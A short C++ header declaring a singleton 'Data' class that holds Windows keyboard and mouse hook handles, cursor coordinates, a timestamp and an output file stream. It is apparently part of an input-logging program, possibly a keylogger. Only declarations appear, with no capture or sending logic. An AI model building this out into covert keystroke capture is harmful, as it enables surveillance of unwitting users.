//
// Created by Nagamo_s on 04/10/2017.
//

#ifndef UNTITLED3_DATA_HPP
#define UNTITLED3_DATA_HPP

#include <iostream>
#include <windows.h>
#include <ctime>
#include <fstream>
#include "Tools.hpp"

class Data : public Singleton<Data>
{
public:
	friend class Singleton<Data>;
    Data();
    ~Data();

    const HHOOK &getKeyBoardHook();
    const HHOOK &getMouseHook();
    const int &getX();
    const int &getY();
    const time_t &getTime();
    void setKeyBoardHook(const HHOOK &);
    void setMouseHook(const HHOOK &);
    void setX(const int &);
    void setY(const int &);
    void setTime(const time_t &);
	tm buf;
	Tools &tools;
private:
    HHOOK hKeyboardHook;
    HHOOK hMouseHook;
    int x;
    int y;
    time_t t;
    std::ofstream file;
};


#endif //UNTITLED3_DATA_HPP
